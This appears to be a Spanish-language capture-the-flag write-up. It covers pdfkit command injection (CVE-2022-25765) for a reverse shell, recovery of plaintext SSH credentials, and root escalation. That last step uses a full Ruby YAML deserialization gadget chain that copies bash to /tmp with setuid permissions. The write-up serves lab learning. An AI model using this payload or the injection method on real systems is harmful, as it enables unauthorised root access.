![[Pasted image 20250415154147.png]]
puertos 80 y 22 demomento abiertos ![[Pasted image 20250415154210.png]]
demomento tenemos este dominio hay que escribir en /etc/hosts para que rediriga guay .


Tenemos demomento esta pagina web de aqui sabemos con wappalyzer demomento que esta hecho con estos dos frameworks 

Nginx 1.18.0
Phusion Passenger 6.0.15
 
 Aqui me tire un rato viendo porque no podia cogerme bien la url que le ponia para hacer el pdf y perdi ahi un poco de tiempo 
 [
![[Pasted image 20250416092351.png]]

Asique levante un servidor en la misma red local 
nos tira un pdf con lo que haya en esa misma pagina 
Ahora si pasamos el pdf que nos da por exiftool para ver la metadata de este archivo vemos que estaa creado con ![[Pasted image 20250416092520.png]]

pdfkit v0.8.6 que es vulnerable al siguiente CVE (PDFkit-CMD-Injection-CVE-2022-25765)

El exploit se puede hacer de forma manual voy a intentar leerlo y entenderlo para ver que es lo que hace exactamente 

El exploit parece que envia parametros maliciosos por la URL que no esta bien sanetizada y envia simplemente el payload malicioso a pasar voy a intentar explotarlo de forma manual para entenderlo bien 

![[Pasted image 20250416092948.png]]



Se puede hacer asi de esta manera pero ahora quiero hacerlo con burp directamente de forma manual para practicar ![[Pasted image 20250416094114.png]]


---------------------------------------
Haciendolo de forma manual con burp ![[Pasted image 20250416095616.png]]
Lo estoy intentando entender pero me parece mas complicado de lo que pensaba luego volvere ya que no quiero perder el hilo  tenemos demomento revshell vamos a conseguir una shell interactiva ![[Pasted image 20250416095919.png]]
la tenemos ![[Pasted image 20250416100100.png]]

encontramos un fichero escondido en el home directory de ruby ![[Pasted image 20250416100150.png]]

y encontramos credenciales para poder entrar por ssh ![[Pasted image 20250416100241.png]]


henry:Q3c1AqGHtoI0aXAYFH"
tenemos shell por ssh ![[Pasted image 20250416100332.png]]

![[Pasted image 20250416100355.png]]
y la flag del usuario henry 

podemos ejecutar este binario ![[Pasted image 20250416100425.png]]
que ayer realmente fue lo que me estuvo dando bastantes problemas a la hora de resolverlo y sobretodo entender como funcionaba ya que me parecia un poco complejo y no habia visto codigo en ruby antes 
vemos que el codigo esta llamando a un archivo que se llama dependencies.yml este es el archivo que tenemos que intentar explotar para conseguir una revshell con root ![[Pasted image 20250416100604.png]]

si no recuerdo mal en este codigo de ruby como no se hace refencia directa a la ruta del archivo se podia manipular un poco la cosa 
![[Pasted image 20250416102005.png]]
ejecutando este codigo ```
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: cp /bin/bash /tmp/0xdf; chmod 6777 /tmp/0xdf
         method_id: :resolve
```
que parece que copia la shell dentro de este directorio /tmp/0xdf con permisos altos tenemos acceso a una shell con root 